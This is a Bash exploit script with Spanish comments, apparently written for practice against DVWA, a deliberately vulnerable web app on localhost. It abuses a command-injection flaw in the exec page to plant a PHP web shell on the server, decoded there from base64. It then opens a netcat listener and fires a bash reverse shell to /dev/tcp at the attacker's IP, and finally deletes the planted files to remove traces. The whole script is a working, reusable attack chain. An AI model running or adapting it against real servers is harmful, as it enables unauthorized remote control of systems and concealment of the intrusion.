#!/bin/bash

# ============================
# Exploit para DVWA - RCE + Reverse Shell + Limpieza + Post-explotación
# ============================

# Cargar variables del archivo .env si existe
if [ -f .env ]; then
  export $(grep -v '^#' .env | xargs)
fi

# ----------------------------
# CONFIGURACIÓN INICIAL PERSONALIZABLE
# ----------------------------

URL_BASE="http://localhost:8080"
URL="$URL_BASE/vulnerabilities/exec/"
read -p "Introduce la Cookie actual: " cookie
read -p "Introduce el Nivel de Seguridad actual: " seguridad
COOKIE="PHPSESSID=$cookie; security=$seguridad"
ATTACKER_IP="$IP_USER"
ATTACKER_PORT="4444"

echo "[+] Comenzando el ataque Command Injection: "
echo "    URL: $URL"
echo "    Cookie: $COOKIE"
echo "    IP atacante: $ATTACKER_IP"
echo "    Puerto de escucha: $ATTACKER_PORT"


# Archivos temporales locales y rutas remotas
PAYLOAD_FILE="cmd.php"
ENCODED_FILE="cmd.txt"
REMOTE_DIR="/var/www/html/vulnerabilities/exec"
REMOTE_B64="$REMOTE_DIR/cmd.b64"
REMOTE_PHP="$REMOTE_DIR/cmd.php"

# ----------------------------
# FUNCIONES AUXILIARES
# ----------------------------

inject_cmd() {
  local cmd="$1"
  curl -s "$URL" \
    -H "Cookie: $COOKIE" \
    --data-urlencode "127.0.0.1%0a$cmd" \
    --data "Submit=Submit" > /dev/null
}

# ----------------------------
# PASO 1: Crear archivo malicioso
# ----------------------------

echo "[*] Creando archivo $PAYLOAD_FILE..."
cat << 'EOF' > $PAYLOAD_FILE
<?php system($_GET['cmd']); ?>
EOF

# ----------------------------
# PASO 2: Codificar en base64
# ----------------------------

echo "[*] Codificando el archivo en base64..."
base64 $PAYLOAD_FILE > $ENCODED_FILE

# ----------------------------
# PASO 3: Eliminar restos anteriores
# ----------------------------

echo "[*] Eliminando restos de ejecuciones anteriores..."
inject_cmd "rm $REMOTE_B64 $REMOTE_PHP"

# ----------------------------
# PASO 4: Subida del archivo codificado
# ----------------------------

echo "[*] Subiendo archivo base64 al servidor..."
while IFS= read -r line; do
  inject_cmd "echo $line >> $REMOTE_B64"
done < $ENCODED_FILE
echo "[+] Archivo base64 subido."

# ----------------------------
# PASO 5: Decodificar y crear cmd.php
# ----------------------------

echo "[*] Decodificando base64 y generando cmd.php en el servidor..."
inject_cmd "base64 -d $REMOTE_B64 > $REMOTE_PHP"

echo "[+] cmd.php disponible en:"
echo "    --> $URL_BASE/vulnerabilities/exec/cmd.php"

# ----------------------------
# PASO 6: Abrir escucha con Netcat
# ----------------------------

echo "[*] Abriendo Netcat en el puerto $ATTACKER_PORT..."
if command -v gnome-terminal &> /dev/null; then
  gnome-terminal -- bash -c "echo '[*] Esperando conexión en puerto $ATTACKER_PORT...'; nc -lvnp $ATTACKER_PORT; exec bash" &
elif command -v x-terminal-emulator &> /dev/null; then
  x-terminal-emulator -e "bash -c 'echo \"[*] Esperando conexión...\"; nc -lvnp $ATTACKER_PORT; exec bash'" &
else
  echo "[!] No se detectó entorno gráfico. Ejecuta manualmente en otra terminal:"
  echo "    nc -lvnp $ATTACKER_PORT"
fi

sleep 2

# ----------------------------
# PASO 7: Enviar reverse shell
# ----------------------------

echo "[*] Enviando reverse shell..."
curl -s "$URL_BASE/vulnerabilities/exec/cmd.php?cmd=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/$ATTACKER_IP/$ATTACKER_PORT%200%3E%261'" > /dev/null
echo "[✔] Shell enviada."

# ----------------------------
# PASO 8: Limpieza del servidor
# ----------------------------

echo "[*] Eliminando archivos temporales (cmd.php y cmd.b64)..."
inject_cmd "rm $REMOTE_B64 $REMOTE_PHP"
echo "[✔] Limpieza realizada."
